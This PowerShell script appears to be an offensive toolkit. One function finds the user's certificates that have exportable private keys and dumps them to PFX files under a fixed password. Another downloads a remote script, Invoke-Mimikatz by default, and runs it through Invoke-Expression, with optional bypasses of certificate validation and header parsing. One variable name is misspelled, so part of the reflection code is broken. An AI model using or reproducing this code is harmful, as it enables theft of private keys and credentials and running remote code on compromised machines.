function Get-PKICerts {
<#

#>
	$column1=@{expression="subject"; width=30; `
	label="filename";alignment="left"}
	$column2=@{expression="thumbprint"; width=40; `
	label="Thumbprint";alignment="right"}
	$column3=@{expression="Exportable"; width=40; `
	label="Exportable"; alignment="right"}
	
	$finalAnswer=@()
	$certs= gci -path Cert:\CurrentUser\My
	foreach ($cert in $certs) { 
		if ($cert | ? { ($_.HasPrivateKey) -and ( $_.PrivateKey.CspKeyContainerInfo.Exportable) } ) {
			$cert | Add-Member NoteProperty 'Exportable' 'Yes'
			$finalAnswer+=$cert
		}
		elseif ($cert | ? { $_.HasPrivateKey } ) {
			$cert | Add-Member NoteProperty 'Exportable' 'No'
			$finalAnswer+=$cert
		}
	}
	$finalAnswer | format-table $column1, $column2, $column3 -AutoSize
}

function Export-PKICerts {
	get-childitem -path Cert:\CurrentUser\My | ? { ($_.HasPrivateKey) -and ( $_.PrivateKey.CspKeyContainerInfo.Exportable ) } | % { [system.IO.file]::WriteAllBytes("$home\$($_.thumbprint).pfx",($_.Export('PFX','secret')) )}

}

function Get-LastPoweroff {
	Get-EventLog system -source user32 -Newest 1 -InstanceId 2147484722 | Select-Object TimeGenerated, Message | Format-custom
}

function Get-HTTPSFile {
<#
	.Synopsis
		Purpose of this function is to download any ps1 file from a web server via https and immediately loda the module via Invoke-Expression
		
	.Parameter Computername
		The IP of the web server
		
	.Parameter TargetFile
		File that will be downloaded. 
		
#>

param(
	[String]
	$ComputerName,
	[String]
	$TargetFile='Invoke-Mimikatz.ps1',
	[switch]
	$force
	)
	if($force)
	{
		[Net.ServicePointManager]::ServerCertificateValidationCallback={$true}
	}
	
$netAssembly= [Reflection.Assembly]::GetAssembly([System.Net.Configuration.SettingsSection])

if($netAssembly)
{
	$bindingFlags = [Reflection.bindingFlags] "Static, GetProperty,NonPublic"
	$settingsType = $netAssembly.Gettype("System.Net.Configuration.SettingsSectionInternal")
	$instance = $settingType.InvokeMember("Section", $bindingFlags, $null, $null, @())
	
		if($instance)
		{
			$bindingFlags="NonPublic","instance"
			$useUnsafeHeaderParsingField = $settingsType.GetField("useUnsafeHeaderParsing", $bindingFlags)
		
			if($useUnsafeHeaderParsingField)
			{
				$useUnsafeHeaderParsingField.SetValue($instance,$true)		
			}
	}
}
	
Invoke-Expression(New-Object net.webclient).downloadstring("https://$ComputerName/$targetFile")	
}

